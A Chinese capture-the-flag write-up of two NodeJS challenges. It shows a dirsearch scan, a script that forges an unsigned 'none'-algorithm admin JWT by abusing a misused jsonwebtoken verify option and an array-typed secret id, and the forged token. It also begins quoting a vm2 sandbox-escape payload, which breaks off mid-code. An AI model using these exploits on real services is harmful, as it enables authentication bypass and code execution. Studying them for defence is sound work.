@@ -1,0 +1,380 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="8ad91b225e9f4030d286c4b37077f658">虎符杯两道NodeJS题目的分析</h1>
+<h2 data-content="1" id="463bc1656944ef16b0b252dbbf1541f1">0x0 前言</h2>
+<p> 感觉比较有意思的一次比赛题目，NodeJS的题目出的很典型，值得去分析和研究一下。</p>
+<h2 data-content="1" id="d980c84a8009b68b16be44015eff5dae">0x1 EasyLogin</h2>
+<h3 data-content="1" id="ffebfeae0c56d91638f4495cfa0fc8b1">0X1.1 考点</h3>
+<ul>
+<li>常规信息泄露</li>
+<li>NodeJS 基础代码审计</li>
+<li>JWTToken库 实现 JWT的流程</li>
+<li>Javascript tricks</li>
+</ul>
+<h3 data-content="1" id="faeb351d41a15b4a118f02637a113261">0x1.2 分析题目</h3>
+<p>进入页面:</p>
+<p><code>http://da71ab5b-cd34-4b13-a145-4f942b8dd1d9.node3.buuoj.cn/login</code></p>
+<p>首先看一下源码,发现了<code>/static/js/app.js</code>:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203016-2e4ce028-8a15-1.png"/></p>
+<p>先记录下来</p>
+<p>然后直接打开<code>dirsearch</code>跑一波:</p>
+<pre><code>python3 dirsearch.py -u http://xxx.node3.buuoj.cn/ -e php,js</code></pre>
+<p>buuctf我倒是没扫出来,但是在之前的环境我扫出来了:</p>
+<pre><code>http://8553ee3bca5d4afd82cba14f26571bd78c39d52b06614ac1.changame.ichunqiu.com/app.js
+http://8553ee3bca5d4afd82cba14f26571bd78c39d52b06614ac1.changame.ichunqiu.com/controller.js
+http://8553ee3bca5d4afd82cba14f26571bd78c39d52b06614ac1.changame.ichunqiu.comn/package.json</code></pre>
+<p>然后就到NodeJS的代码审计环节了:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203036-3a1cf42e-8a15-1.png"/></p>
+<p>我们可以很直接看到这个程序是基于KOA框架写的,经典的MVC架构</p>
+<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">rest</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'./rest'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">controller</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'./controller'</span><span class="p">);</span>
+</pre></div>
+<p>通过这两句话,可以判断<code>app.js</code>同级目录,还存在<code>rest.js</code> and <code>controller.js</code></p>
+<p>我们分别访问看看:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203103-4a389c50-8a15-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203103-4aa4a97c-8a15-1.png"/></p>
+<p>其实代码量不是很大，大概也能读懂，但是大概读懂跟发现漏洞细节差别是很大的，所以我们最好能深入理解下这个程序的执行流程，这个时候我选择了根据KOA关键字和一些代码找了一些相关资料来进行了学习。</p>
+<p>比如肖雪峰的<a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023025933764960" target="_blank">NodeJs Web开发</a>,通过对比，我可以快速排除一些可能的漏洞点，比如任意文件读取之类的，下面我们来分析看看。</p>
+<p>我们在命令行新建一个项目:</p>
+<div class="highlight"><pre><span></span>npm init
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203150-66836ac0-8a15-1.png"/></p>
+<p>接着我们尝试安装KOA,通过源文件泄露的<code>package.json</code>的我们可以确定KOA的版本</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203205-6f2d9f24-8a15-1.png"/></p>
+<p>所以我们也安装一个相同的版本在本地进行测试:</p>
+<p><code>npm install koa@2.11.0</code></p>
+<p>然后我们在<code>index.js</code>运行下面一个例子来分析。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203227-7cb79eec-8a15-1.png"/></p>
+<p>koa执行逻辑的一个简单例子:</p>
+<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">Koa</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'koa'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Koa</span><span class="p">();</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">await</span> <span class="nx">next</span><span class="p">();</span>
+    <span class="nx">ctx</span><span class="p">.</span><span class="nx">response</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="s1">'text/html'</span><span class="p">;</span>
+    <span class="nx">ctx</span><span class="p">.</span><span class="nx">response</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="s1">'&lt;h1&gt;Hello, koa2!&lt;/h1&gt;'</span><span class="p">;</span>
+<span class="p">});</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"app start at port 3000..."</span><span class="p">)</span>
+</pre></div>
+<p>逻辑是:</p>
+<pre><code>用户的每一个url请求-&gt;koa对象拦截-&gt;调用通过app.use注册async函数(这个函数理解为异步操作函数就行了)</code></pre>
+<p><code>async(ctx, next)</code>函数的处理逻辑:</p>
+<blockquote>
+<p>ctx形参是可以接受koa传入的封装的request and response变量的值</p>
+<p>next 是koa传入的将要处理下一个异步函数。</p>
+</blockquote>
+<p><code>ctx</code>可以帮助我们获取请求参数的内容，这里同样可以设置返回的内容。</p>
+<p>那么函数里面的<code>await next()</code>调用下一个异步函数的作用是什么呢？</p>
+<blockquote>
+<p>因为KOA把async函数组成了一个处理链,所以能够异步处理到链中的每一个函数，所以我们都需要设置这句话。</p>
+<p>其中app.use()出现的顺序决定了每个async执行的顺序。</p>
+</blockquote>
+<p>那么我们如何针对不同URL来选择不同的<code>async</code>函数来处理呢?</p>
+<p>一种经典的用法是:</p>
+<div class="highlight"><pre><span></span><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">path</span> <span class="o">===</span> <span class="s1">'/'</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">ctx</span><span class="p">.</span><span class="nx">response</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="s1">'index page'</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">await</span> <span class="nx">next</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+</pre></div>
+<p>通过<code>ctx.request.path</code>来判断:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203243-85f111f0-8a15-1.png"/></p>
+<p>但是这样有点缺点，就是这样判断感觉太费力了。</p>
+<p>这个时候,我们就引入了<code>koa-router</code>来解析路由，<code>koa-bodyparser</code>来解析内容(这样我们就不用自己通过<code>str.split('&amp;')</code>来解析传送来的表单或者json的相关内容了。</p>
+<p>题目中还用到<code>Crypto</code>库来生成<code>app.keys</code>,<code>koa-static</code>,<code>koa-views</code>等一些库</p>
+<p><code>const { resolve } = require('path');</code></p>
+<p>这里注意下这个代码等价于:</p>
+<pre><code>const _ = require('path');
+const resolve = _.resolve;
+//resolve 的功能主要是拼接路径,怎么拼接?</code></pre>
+<blockquote>
+<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="p">{</span> <span class="nx">resolve</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'path'</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">resolve</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s2">"..//test"</span><span class="p">)</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">path</span><span class="p">);</span>
+</pre></div>
+<p>output:</p>
+<pre><code>/Users/xq17/Desktop/t/easy_login/node_modules
+/Users/xq17/Desktop/t/easy_login/test</code></pre>
+</blockquote>
+<p>阅读到此,我们已经可以基本理解<code>app.js</code>到底做了什么。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203332-a324003e-8a15-1.png"/></p>
+<p>那么我们下面就开始着重分析下:<code>rest.js</code> and <code>controller.js</code></p>
+<p>先从<code>controller.js</code>开始说起,这里为什么要注册个controller的对象呢？</p>
+<p>如果我们按照上面所说的用<code>router</code>处理URL</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203342-a8e1f47c-8a15-1.png"/></p>
+<p>可以看到逻辑是这样的</p>
+<p><code>app.user-&gt;router.routes-&gt;router.get</code>这样一个逻辑,这样的话所有路由也是集中在<code>index.js</code>,所以为了减少<code>index.js</code>的代码量，题目采取了重写一个继承<code>router</code>框架的路由注册到<code>app.use</code>中,并且采取了<code>module.export</code>的方式开放自己的调用权限。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200512092526-757895a8-93ef-1.png"/></p>
+<p>可以看到这种思路其实是扫描<code>controllers</code>路径下的js文件,然后加载他们<code>moudle.exports</code>开放出来变量注册到router里面去。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203410-b9d71334-8a15-1.png"/></p>
+<p>当时我是没找到<code>api.js</code>文件的,但是我看到了<code>reset.js</code>文件</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203418-bec4a1e0-8a15-1.png"/></p>
+<p>其实作用很简单,就是先于控制器，绑定ctx绑定了一个rest的属性,给ctx绑定一个统一的返回类型，然后可以在控制器里面通过<code>ctx.rest({token:token})</code>来统一调用。</p>
+<p>然后结合案例,猜测了<code>controllers/api.js</code> <code>controllers/login.js</code>等格式</p>
+<p>确定了<code>api.js</code>,由此我们来到了与用户交互最重要的控制器环节。</p>
+<p>(1) 注册环节</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203429-c56ee42e-8a15-1.png"/></p>
+<p>这里值得注意的是限制了admin注册，说明后面肯定需要绕过这里</p>
+<p><strong>(2) 登录环节</strong></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203444-ce03e4f4-8a15-1.png"/></p>
+<p>这里单从代码逻辑上看是没有问题的。</p>
+<p>(3)GetFlag环节</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203452-d2b0664e-8a15-1.png"/></p>
+<h3 data-content="1" id="1cfb9e8507184d7c33c14cace444589a">0x1.3 题目核心分析</h3>
+<p>通过上面的分析,我们的目标就是伪造admin用户</p>
+<p>当时我是存在了两种思路的:</p>
+<blockquote>
+<p>1.通过注册一个admin%00-%255等的畸形用户,绕过===判断,然后在jwt.sign环节签名的时候如果有去除这些字符的功能，就可以实现绕过</p>
+<p>2.尝试攻击jwt.verify函数弱点,实现None签名绕过(Ps.这个点如果没做过一些相关题目，是很难想到的，这也是题目的主要解，下面我会从原理来进行分析一次)</p>
+</blockquote>
+<p>为了分析这两种思路的可行性,我们先编写一个简易的代码用来debug:</p>
+<pre><code>1.npm install koa-jwt@3.6.0
+2.index.js</code></pre>
+<p>首先我们可以快速FUZZ一下可能性:</p>
+<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'crypto'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'jsonwebtoken'</span><span class="p">);</span>
+
+<span class="kr">const</span> <span class="nx">secret</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">18</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"secret:\n"</span> <span class="o">+</span> <span class="nx">secret</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">secretid</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="kr">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
+<span class="kr">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="s1">'123'</span><span class="p">;</span>
+<span class="c1">// const token = jwt.sign({secretid, username, password}, secret, {algorithm:'HS256'});</span>
+<span class="c1">// console.log("token:\n"+token);</span>
+<span class="c1">// const user = jwt.verify(token, secret, {algorithm: 'HS256'});</span>
+<span class="c1">// console.log(user.username + " length:" + user.username.length);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"start Fuzzing..."</span><span class="p">);</span>
+<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;=</span><span class="mi">255</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+    <span class="nx">fuzzName</span> <span class="o">=</span> <span class="nx">username</span><span class="o">+</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+    <span class="c1">// console.log(fuzzName + "length:" + fuzzName.length);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">fuzzName</span> <span class="o">!==</span> <span class="s1">'admin'</span><span class="p">){</span>
+        <span class="nx">_token</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">({</span><span class="nx">secretid</span><span class="p">,</span> <span class="nx">fuzzName</span><span class="p">,</span> <span class="nx">password</span><span class="p">},</span> <span class="nx">secret</span><span class="p">,</span> <span class="p">{</span><span class="nx">algorithm</span><span class="o">:</span><span class="s1">'HS256'</span><span class="p">});</span>
+        <span class="nx">_user</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">_token</span><span class="p">,</span> <span class="nx">secret</span><span class="p">,</span> <span class="p">{</span><span class="nx">algorithm</span><span class="o">:</span> <span class="s1">'HS256'</span><span class="p">});</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">_user</span><span class="p">.</span><span class="nx">fuzzName</span> <span class="o">===</span> <span class="s1">'admin'</span><span class="p">){</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"success! i:"</span> <span class="o">+</span> <span class="nx">i</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"fail! i:"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="s2">" userFuzzname:"</span> <span class="o">+</span> <span class="nx">_user</span><span class="p">.</span><span class="nx">fuzzName</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>很遗憾,失败告终。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203508-dcaa6172-8a15-1.png"/></p>
+<p>虽然可以排除一些猜想,但是还是该保守点, 我选择了跟进代码看看jwt库会不会对<code>username</code>进行什么特殊处理。</p>
+<p>这里笔者用的是VScode来进行调试:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203518-e2181c94-8a15-1.png"/></p>
+<p>跟进断点:</p>
+<p><code>/node_modules/jsonwebtoken/sign.js</code></p>
+<p>前面都是对参数做了非空判断、类型转换等操作</p>
+<p>在114行对<code>payload</code>进行了校验,因为对象是引用类型，所以有可能对payload的值进行修改，所以我们跟进看看:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203539-eec82858-8a15-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203540-ef47117c-8a15-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203540-ef6911c8-8a15-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203540-efb63a8e-8a15-1.png"/></p>
+<p>此时的调用栈如下,可以看到这里的操作只是单纯判断,<code>allowUnkown</code>为true,所以并没有执行什么操作。</p>
+<p>我们继续在114向后跟进处理吧</p>
+<p>最终跟进这里:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203645-162018c0-8a16-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203743-38811d38-8a16-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203739-367e3066-8a16-1.png"/></p>
+<p>我们不难看到的payload</p>
+<p>调用栈如下:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203754-3f94c8f4-8a16-1.png"/></p>
+<p>这里我们可以看到:</p>
+<p>我们的payload强制转换采用的<code>JSON.stringify</code>的函数,然后采用base64url进行了编码，最后将生成的数据进行签名防止被篡改。</p>
+<p>那么我们的问题就转移到了<code>JSON.stringify</code>函数的处理中:</p>
+<p>因为是js的原生函数,</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203806-4671e51c-8a16-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203810-489ac912-8a16-1.png"/></p>
+<p>如果Json里面的键值字符串内容进行特殊处理的话，文档里面应该会提到的，结果查阅之后发现并没有，那么这种解决思路很明显是行不通的，所以我们应该抛弃这种思路。</p>
+<p>那么这道题的正确思路是怎么样的呢？</p>
+<p>这个问题我们得先从jwt的verify流程开始跟起:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203838-597b718c-8a16-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203840-5aa4e458-8a16-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203842-5c407692-8a16-1.png"/></p>
+<p>最后我们跟到获取<code>getSecret</code>的关键处</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203851-614a3af6-8a16-1.png"/></p>
+<p>这里就很有意思了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203901-674644a4-8a16-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203901-67642c4e-8a16-1.png"/></p>
+<p>可以看到</p>
+<p><code>hasSignature</code>的值当我们token不传第2部分即签名位时，可以控制为<code>false</code></p>
+<p>然后<code>options.algorithms</code>这里源码利用的<code>algorithms</code>带s的这个属性来判断，而我们传入的确是</p>
+<p><code>options.algorithm</code>那么也就是说源码里面默认就是<code>options.algorithms</code>这个值本身就是None的</p>
+<p>不存在的。</p>
+<p>那么这个程序为什么能跑起来呢？</p>
+<p>因为我们加密的时候的确是选择了签名的，所以<code>`hasSignature=TRUE</code><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203918-714eb2c4-8a16-1.png"/></p>
+<p>就算我们没有传入的<code>options.algorithms</code>程序也会默认加载系统定义的类型:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203934-7b3af7de-8a16-1.png"/><br/>
+这样子我们alg的构造头里面存在其中的方法，那么程序就可以正常运行了。</p>
+<p>由上面可知我们生成的token</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429203949-83fffaea-8a16-1.png"/></p>
+<p>是采用的了<code>HS256</code>加密方式加密的，所以这个流程走完是没问题的。</p>
+<p>这也是这个程序的一个容错机制的体现，能够根据加密的内容来选择解密方式。</p>
+<p>那么我们怎么实现攻击呢？</p>
+<p>我们需要伪造一个None签名的<code>token</code>,也就是不进行签名判断</p>
+<p>但是我们需要绕过上面的一个判断:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204004-8cd30694-8a16-1.png"/></p>
+<p>那就是<code>secretOrPublicKey</code>这个值必须为<code>False</code>,这个值</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204011-90cb2182-8a16-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204018-955c8574-8a16-1.png"/></p>
+<p>这个值其实就是我们传入的密钥,所以我们要让None签名顺利走完这个流程，我们需要控制密钥的值为undefine或者为空</p>
+<div class="highlight"><pre><span></span><span class="k">if</span><span class="p">(</span><span class="kc">undefined</span> <span class="o">||</span> <span class="s1">''</span><span class="p">){</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"fail"</span><span class="p">)</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"ok"</span><span class="p">)</span>
+<span class="p">}</span>
+<span class="c1">// output</span>
+<span class="nx">ok</span>
+</pre></div>
+<p>而前面可知,我们的密钥是根据一个数组然后通过下标来取的,题目对下标还做了判断</p>
+<div class="highlight"><pre><span></span><span class="k">if</span><span class="p">(</span><span class="nx">sid</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="nx">sid</span> <span class="o">===</span> <span class="kc">null</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="nx">sid</span> <span class="o">&lt;</span> <span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="nx">sid</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nx">APIError</span><span class="p">(</span><span class="s1">'login error'</span><span class="p">,</span> <span class="s1">'no such secret id'</span><span class="p">);</span>
+        <span class="p">}</span>
+</pre></div>
+<p>AngstromCTF 2019出过类似的题目思想,利用javascript的弱类型特点，可以绕过</p>
+<div class="highlight"><pre><span></span><span class="nx">sid</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">sid</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="nx">sid</span> <span class="o">===</span> <span class="kc">null</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="nx">sid</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="nx">sid</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">));</span>
+</pre></div>
+<p>所以说我们只需要构造一个这样的</p>
+<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'crypto'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'jsonwebtoken'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">secretid</span> <span class="o">=</span> <span class="p">[];</span>
+<span class="kr">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
+<span class="kr">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="s1">'123'</span><span class="p">;</span>
+<span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">({</span><span class="nx">secretid</span><span class="p">,</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">},</span> <span class="s1">''</span><span class="p">,</span> <span class="p">{</span><span class="nx">algorithm</span><span class="o">:</span><span class="s1">'none'</span><span class="p">});</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
+</pre></div>
+<p>得到伪造的token值</p>
+<pre><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTU4ODEzODI1MH0.</code></pre>
+<p>我们直接抓登录包,修改为伪造token值,密码修改为123</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204039-a189813a-8a16-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204039-a1e2367c-8a16-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204039-a1f9bf5e-8a16-1.png"/></p>
+<p><strong>PS.问题衍生之正确的用法:</strong></p>
+<p>因为传入的是Object类型，所以就算多出多余的属性，也不会报错，所以这个考点可以说是出题人用来混淆我们视线的一个坑，还有就是开发者对于该库的使用太轻率，</p>
+<p>没有好好阅读相关文档。</p>
+<p>官方的用法:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204100-ae3e2548-8a16-1.png"/></p>
+<p>正确的用法应该是这样的:</p>
+<pre><code>const user = jwt.verify(token, secret, {algorithms: ['HS256']});
+而不是我们题目里面的:
+const user = jwt.verify(token, secret, {algorithm: 'HS256'});</code></pre>
+<h2 data-content="1" id="4d04e47c2ce98b8c737473c1ab9af0df">0x2  JustEscape</h2>
+<p>这道题目从题目来看就能猜到是逃逸相关的题目，不过出题人的确花了一番心思去移花接木，不让考点那么直接，从而避免了被秒解的尴尬。</p>
+<h3 data-content="1" id="8a797dbb13b4c1a95d62d3dc78abd3fe">0x2.1 考点</h3>
+<ul>
+<li>fuzz</li>
+<li>沙盒逃逸</li>
+</ul>
+<h3 data-content="1" id="a41175bd55f756559bce0f11ef1996ed">0x2.2 题目分析</h3>
+<p>入口是这个地址, 当时看到这个提示，我心理还是觉得很奇怪的。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204121-bac482bc-8a16-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204135-c3072254-8a16-1.png"/></p>
+<p>感觉这个不像是PHP的代码，反而很像Javascript的语言，简单测试无果，直接开dirsearch发现了一个这个<code>index.php</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204150-cbd00e1e-8a16-1.png"/></p>
+<p>这不是个shell吗？</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204159-d162d528-8a16-1.png"/></p>
+<p>后面才发现作者真的是用心良苦,很明显就是nodejs采用express写的一个网站。</p>
+<p>这下子我们就需要转换下思路了，从PHP-&gt;NodeJS</p>
+<pre><code>http://7e95c322-db39-4050-abaf-cd5ce28c954f.node3.buuoj.cn/run.php?code=new%20function(){%20throw%20e;}</code></pre>
+<p>很明显这是一道沙盒逃逸题:</p>
+<p>那么我们肯定要收集下信息，这里我们打印错误的堆栈信息:</p>
+<p><code>run.php?code=new Error().stack</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204209-d78b14e2-8a16-1.png"/></p>
+<p>确定了是vm2的库:</p>
+<pre><code>/app/node_modules/vm2/</code></pre>
+<p>搜索下网上的内容，发现这个库出现在题目中不是一次两次了，我们通过文章定位到了:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204217-dc121f38-8a16-1.png"/></p>
+<p><code>https://github.com/patriksimek/vm2/issues?q=author%3AXmiliaH+</code></p>
+<p>通过这个链接我们很容易得到了这个逃逸的方式:</p>
+<p>这里最新版是:3.9.1, 这里我们用3.8.3 来尝试下:</p>
+<p><code>npm install vm2@v3.8.3</code></p>
+<p>这个大神给出了两个<a href="https://github.com/patriksimek/vm2/issues/225" target="_blank">payload</a>:</p>
+<p>其中一个是:</p>
+<div class="highlight"><pre><span></span><span class="s2">"use strict"</span><span class="p">;</span>
+<span class="kr">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'vm2'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">untrusted</span> <span class="o">=</span> <span class="s1">'('</span> <span class="o">+</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="nx">TypeError</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">get_process</span> <span class="o">=</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s2">"return process"</span><span class="p">)();</span>
+    <span class="k">try</span><span class="p">{</span>
+        <span class="nb">Object</span><span class="p">.</span><span class="nx">preventExtensions</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="s2">""</span><span class="p">)).</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
